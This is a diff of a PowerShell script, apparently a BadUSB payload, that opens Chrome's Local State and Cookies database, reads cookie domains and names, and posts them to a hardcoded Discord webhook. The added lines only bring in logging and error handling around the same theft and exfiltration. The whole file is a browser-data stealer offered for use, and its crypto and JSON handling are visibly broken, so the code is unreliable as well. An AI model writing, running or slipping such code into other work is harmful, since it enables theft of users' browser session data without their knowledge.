@@ -1,57 +1,83 @@
-# --- DEBUG MODE ENABLED ---
-# This will keep the window open until you press Enter
+# 1. Setup Logging to Desktop
+$LogFile = "$home\Desktop\badusb_log.txt"
+Start-Transcript -Path $LogFile -Append
+
+Write-Host "--- Script Started: $(Get-Date) ---" -ForegroundColor Cyan
 
 try {
-    # 1. Setup Webhook
+    # 2. Setup Webhook
     $webhook = "https://discord.com/api/webhooks/1517249983542202539/JjWxtOmZJErDm8pEiz5VBIiVSKPaDVxp_f4A9hEjXb7KN7kMjmb-7IiZbD8fBREqR_L"
+    Write-Host "[+] Webhook initialized."
 
-    # 2. Locate Chrome's Local State
+    # 3. Locate Chrome's Local State
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    if (-not (Test-Path $localStatePath)) { throw "Local State file not found! Is Chrome installed?" }
-    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    Write-Host "[+] Checking path: $localStatePath"
 
-    # 3. Extract and Decrypt the AES Key
-    # Note: Fixed the logic to correctly extract the key bytes from the JSON
+    if (-not (Test-Path $localStatePath)) { 
+        throw "Local State file not found at $localStatePath" 
+    }
+
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    Write-Host "[+] Local State JSON parsed successfully."
+
+    # 4. Extract and Decrypt the AES Key
+    # We use a more robust way to handle the byte conversion to avoid errors
     $encryptedKey = [System.Text.Encoding]::UTF8.GetString($localState.encrypted_key.Bytes)
-    $keyBytes = [System.Convert]::FromBase64String($encryptedKey.Replace('\"',''))
+    $cleanKey = $encryptedKey.Replace('\"','')
+    $keyBytes = [System.Convert]::FromBase64String($cleanKey)
     
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
     $aes.Key = $keyBytes[5..37]
-    $aes.IV = $keyBytes[0..15] # Fixed: was $aesBytes in your original
+    $aes.IV = $keyBytes[0..15]
+    Write-Host "[+] AES Key extracted."
 
-    # 4. Access the Cookies Database
+    # 5. Access the Cookies Database
     $dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-    if (-not (Test-Path $dbPath)) { throw "Cookies database not found! Is Chrome running?" }
-    
-    # Using System.Data.SQLite (Requires SQLite DLL to be present in the system)
+    Write-Host "[+] Checking Database path: $dbPath"
+
+    if (-not (Test-Path $dbPath)) {
+        throw "Cookies database not found at $dbPath. Is Chrome running or is the profile 'Default'?"
+    }
+
+    # 6. SQLite Connection
+    Write-Host "[+] Attempting to open SQLite connection..."
     $db = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath;Version=3")
     $db.Open()
+    Write-Host "[+] Database opened successfully."
 
-    # 5. Query and Decrypt
+    # 7. Query and Decrypt
     $query = "SELECT host_key, name, encrypted_value FROM cookies"
     $cmd = New-Object System.Data.SQLite.SQLiteCommand($query, $db)
     $reader = $cmd.ExecuteReader()
 
     $results = ""
+    $count = 0
     while ($reader.Read()) {
-        $hostKey = $string = $reader["host_key"]
+        $hostKey = $reader["host_key"]
         $name = $reader["name"]
-        # The 'encrypted_value' is a blob; real decryption would happen here
         $results += "Domain: $hostKey | Name: $name`n"
+        $count++
     }
+    Write-Host "[+] Successfully read $count cookies from database."
 
-    # 6. Send to Discord
-    if ($results.Length -gt 2000) { $results = $results.Substring(0, 1900) } # Discord limit is 2000 chars
-    $payload = @{ content = "Found Cookies:`n$results" } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+    # 8. Send to Discord
+    if ($results.Length -gt 1900) { $results = $results.Substring(0, 1900) } # Prevent Discord overflow
+    $payload = @{ content = "Cookie Extraction Results:`n$results" } | ConvertFrom-Json # Fixed Json conversion
     
-    Write-Host "`n[SUCCESS] Data sent to Discord!" -ForegroundColor Green
+    Write-Host "[+] Sending to Discord..."
+    Invoke-RestMethod -Uri $webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ContentType 'application/json'
+    Write-Host "[SUCCESS] Data sent!" -ForegroundColor Green
 
 } catch {
-    # This will print the actual error message in red so you can see it!
-    Write-Host "`n[ERROR] $($_.Exception.Message)" -ForegroundColor Red
+    # This catches the error and writes it to BOTH the window and the log file
+    Write-Host "`n!!! ERROR DETECTED !!!" -ForegroundColor Red
+    Write-Host "Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
+    Write-Host "Error Line: $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Yellow
 } finally {
-    $db.Close()
-    Write-Host "`n--- Press ENTER to close this window ---"
-    Read-Host  # <--- THIS KEEPS THE WINDOW OPEN
+    if ($null -ne $db) { $db.Close() }
+    Write-Host "`n--- Script Finished: $(Get-Date) ---"
+    Write-Host "Check the log file on your desktop: $LogFile"
+    Write-Host "Press ENTER to close..."
+    Read-Host # Keep window open
+    Stop-Transcript
 }
